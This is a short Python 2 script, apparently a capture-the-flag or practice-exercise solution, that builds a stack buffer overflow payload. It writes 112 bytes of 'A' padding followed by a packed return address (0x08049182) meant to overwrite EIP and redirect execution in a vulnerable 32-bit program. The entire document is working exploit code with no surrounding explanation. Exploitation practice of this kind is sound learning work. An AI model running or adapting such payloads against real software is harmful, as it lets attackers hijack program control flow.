import struct

offset=112

EIP=struct.pack("I", 0x08049182)

buffer = "A" * offset + EIP

print buffer
